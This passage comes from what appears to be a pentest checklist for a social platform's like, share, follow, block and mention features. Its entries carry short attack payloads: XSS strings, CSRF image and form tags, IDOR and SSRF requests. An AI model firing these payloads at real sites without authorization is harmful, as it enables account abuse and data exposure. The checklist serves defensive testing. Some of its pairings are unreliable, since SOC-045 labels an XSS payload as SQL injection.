---

## SOC-045 — React Type Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Select reaction type 2. Inject invalid reaction 3. Store malicious reaction type

**Expected Result:** Reaction types should be from predefined list

**Payload Example:**

```
react_type=<script>alert(1)</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-046 — Negative Vote Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Downvote content 2. Manipulate vote value 3. Apply excessive negative score

**Expected Result:** Vote values should be fixed

**Payload Example:**

```
{"vote_value":-1000} instead of -1
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-047 — Like on Private Content
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Find private post ID 2. Like without access 3. Interact with private content

**Expected Result:** Like should verify content access

**Payload Example:**

```
POST /api/posts/private_post/like without view access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-048 — Like Visibility Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Query who liked private post 2. Enumerate users 3. Expose private interactions

**Expected Result:** Like lists should respect content privacy

**Payload Example:**

```
GET /api/posts/private_post/likes
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-049 — Vote Timing Attack
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Vote on multiple posts 2. Analyze response times 3. Identify voting patterns

**Expected Result:** Response times should be consistent

**Payload Example:**

```
Timing analysis on vote endpoints
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-050 — CSRF on Like Action
**Test Category:** Cross-Site Request Forgery · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Create page with like request 2. Victim visits 3. Like registered on victim's behalf

**Expected Result:** Like actions should have CSRF protection

**Payload Example:**

```
<img src="https://target.com/posts/123/like">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-051 — Upvote Self-Content
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Like / React / Upvote

**Test Steps:** 1. Create post 2. Upvote own post 3. Boost own content

**Expected Result:** Self-voting should be restricted

**Payload Example:**

```
Vote on own post via API
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-052 — Share IDOR - Share as Another User
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share post 2. Intercept request 3. Modify sharer_id 4. Share as victim

**Expected Result:** Share should use authenticated user

**Payload Example:**

```
POST /api/posts/123/share {"user_id":"victim_id"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-053 — Share Private Content Publicly
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Find private post 2. Attempt to share publicly 3. Bypass privacy settings

**Expected Result:** Private content should not be shareable publicly

**Payload Example:**

```
POST /api/posts/private_id/share {"visibility":"public"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-054 — Share Count Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share post 2. Intercept response 3. Inflate share count

**Expected Result:** Share counts should be accurate

**Payload Example:**

```
Manipulate share_count in response
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## SOC-055 — Recursive Share Loop
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share post 2. Share the share 3. Create infinite loop

**Expected Result:** Share depth should be limited

**Payload Example:**

```
Share recursively 1000 times
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-056 — Share to External Platform SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Find share to external platform 2. Inject internal URL 3. SSRF via share preview

**Expected Result:** External URLs should be validated

**Payload Example:**

```
share_url=http://internal-server/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SOC-057 — Share Preview XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share URL with XSS 2. Generate preview 3. XSS in preview card

**Expected Result:** Preview content should be sanitized

**Payload Example:**

```
URL with <script> in meta tags
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-058 — Share Attribution Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share post 2. Remove original attribution 3. Claim as original

**Expected Result:** Original author attribution should be protected

**Payload Example:**

```
Remove via_user_id from share
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-059 — CSRF on Share
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Create malicious page triggering share 2. Victim visits 3. Content shared from victim's account

**Expected Result:** Share should require CSRF token

**Payload Example:**

```
<form action="/posts/123/share" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-060 — Share with Modified Content
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share post 2. Intercept request 3. Modify shared content 4. Attribute different content

**Expected Result:** Share should preserve original content

**Payload Example:**

```
{"post_id":"123",modified_content:"fake news"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-061 — Delete Original After Share
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Share / Repost

**Test Steps:** 1. Share post 2. Original author deletes 3. Check share visibility

**Expected Result:** Shares should handle deleted originals

**Payload Example:**

```
Access shared content after original deletion
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-062 — Follow IDOR - Follow as Another User
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Follow user 2. Intercept request 3. Modify follower_id 4. Create follow from victim

**Expected Result:** Follow should use authenticated user

**Payload Example:**

```
POST /api/users/123/follow {"follower_id":"victim"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-063 — Unfollow IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Unfollow user 2. Modify follow relationship ID 3. Remove others' follows

**Expected Result:** Unfollow should verify relationship ownership

**Payload Example:**

```
DELETE /api/follows/victim_relationship_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-064 — Bypass Follow Request Approval
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Send follow request to private account 2. Bypass approval 3. Access private content

**Expected Result:** Follow requests should require approval

**Payload Example:**

```
POST /api/users/private/follow?auto_approve=true
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-065 — Follow Private Account IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. View private account followers 2. Modify user_id 3. See others' private followers

**Expected Result:** Follower lists should respect privacy

**Payload Example:**

```
GET /api/users/private_user/followers
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-066 — Mass Follow for Spam
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Follow many users rapidly 2. Bypass rate limits 3. Spam via follow notifications

**Expected Result:** Follow rate should be limited

**Payload Example:**

```
Follow 10000 users in 1 minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SOC-067 — Follow Count Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. View follower count 2. Manipulate count in response 3. Display fake popularity

**Expected Result:** Follower counts should be accurate

**Payload Example:**

```
Response modification for fake counts
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## SOC-068 — Follow Self
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Attempt to follow own account 2. Bypass restriction 3. Inflate follower count

**Expected Result:** Self-follow should be prevented

**Payload Example:**

```
POST /api/users/self_id/follow
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-069 — Follower List Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Request follower list 2. Paginate through all 3. Enumerate private relationships

**Expected Result:** Lists should have reasonable limits

**Payload Example:**

```
GET /api/users/123/followers?limit=999999
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / Postman

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SOC-070 — CSRF on Follow
**Test Category:** Cross-Site Request Forgery · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Create page triggering follow 2. Victim visits 3. Victim follows attacker

**Expected Result:** Follow should require CSRF token

**Payload Example:**

```
<img src="https://target.com/users/attacker/follow">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-071 — Pending Follow Request Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. Send follow request 2. Manipulate request status 3. Auto-approve pending request

**Expected Result:** Request status should be recipient-controlled

**Payload Example:**

```
PUT /api/follow-requests/123 {"status":"approved"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-072 — Follow Suggestion Privacy Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Follow / Unfollow

**Test Steps:** 1. View follow suggestions 2. Analyze suggestion algorithm 3. Infer private connections

**Expected Result:** Suggestions should not leak private info

**Payload Example:**

```
Suggestions revealing victim's private follows
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-073 — Block Bypass via API
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. User A blocks User B 2. User B accesses A's content via API 3. Bypass block

**Expected Result:** Block should be enforced at all levels

**Payload Example:**

```
Direct API access to blocked user's posts
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-074 — Block IDOR - Block as Another User
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Block user 2. Modify blocker_id 3. Create block from victim's account

**Expected Result:** Block should use authenticated user

**Payload Example:**

```
POST /api/blocks {"blocker_id":"victim",blocked_id:"target"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-075 — Unblock IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Unblock user 2. Modify block_id 3. Remove others' blocks

**Expected Result:** Unblock should verify block ownership

**Payload Example:**

```
DELETE /api/blocks/victim_block_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-076 — View Blocked User Profile
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Block user 2. Access blocked user's profile 3. Check visibility

**Expected Result:** Blocking should be mutual if configured

**Payload Example:**

```
GET /api/users/blocked_user_id/profile
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-077 — Block List Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Access block list API 2. View all blocked users 3. Extract private relationships

**Expected Result:** Block lists should be private

**Payload Example:**

```
GET /api/users/victim/blocks without auth
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-078 — Mute Notification Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Mute user 2. User changes username 3. Notifications resume

**Expected Result:** Mute should persist through changes

**Payload Example:**

```
Mute bypassed via account changes
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-079 — CSRF on Block
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Create page triggering block 2. Victim visits 3. Victim blocks innocent user

**Expected Result:** Block should require CSRF token

**Payload Example:**

```
<img src="https://target.com/users/innocent/block">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-080 — Block Evasion via New Account
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. User A blocks User B 2. User B creates new account 3. Accesses A's content

**Expected Result:** Consider device/IP based restrictions for severe cases

**Payload Example:**

```
New account accessing blocked content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-081 — Mass Block Denial of Service
**Test Category:** Denial of Service · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Block many users rapidly 2. Exhaust blocking capacity 3. Prevent legitimate blocks

**Expected Result:** Block actions should be rate-limited

**Payload Example:**

```
Block 100000 users rapidly
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-082 — Blocked User Mention
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Block / Mute Users

**Test Steps:** 1. Block user 2. Blocked user mentions blocker 3. Check notification

**Expected Result:** Mentions from blocked users should be filtered

**Payload Example:**

```
Blocked user @mentions blocker
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-083 — XSS via Mention Display
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Create post mentioning user 2. Inject XSS in mention rendering 3. View post

**Expected Result:** Mention display should be sanitized

**Payload Example:**

```
@<script>alert('XSS')</script>user
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-084 — Mention IDOR - Mention Private User
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Find private user's ID 2. Mention in public post 3. Expose private user

**Expected Result:** Private users should not be mentionable publicly

**Payload Example:**

```
@private_user_hidden_id in public post
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-085 — Mention Notification Spam
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Mention user in many posts 2. Flood with notifications 3. DoS via notifications

**Expected Result:** Mention notifications should be rate-limited

**Payload Example:**

```
100 posts mentioning same user per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SOC-086 — Mention Blocked User
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Block user 2. Mention blocked user 3. Check if notified

**Expected Result:** Blocked users should not receive mentions

**Payload Example:**

```
@blocked_user in post
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-087 — Mass Mention Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Mention many users in single post 2. Send mass notifications 3. Abuse notification system

**Expected Result:** Mention count per post should be limited

**Payload Example:**

```
Post with @user1 @user2 ... @user1000
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-088 — Mention Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Type @ symbol 2. Enumerate suggested users 3. Discover private users

**Expected Result:** Suggestions should respect privacy settings

**Payload Example:**

```
Autocomplete revealing private users
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SOC-089 — Photo Tag IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Tag user in photo 2. Modify tag to add others without consent 3. Tag victims

**Expected Result:** Tagging should respect user preferences

**Payload Example:**

```
Tag non-consenting users in photos
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-090 — Location Tag Spoofing
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. Tag location in post 2. Modify coordinates 3. Appear at fake location

**Expected Result:** Location tags should be validated

**Payload Example:**

```
{"location_id":"fake",lat:0,lng:0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-091 — Remove Others' Tags IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. View tagged photo 2. Remove tag 3. Modify to remove others' tags

**Expected Result:** Tag removal should verify permissions

**Payload Example:**

```
DELETE /api/photos/123/tags/victim_tag_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-092 — Tag Approval Bypass
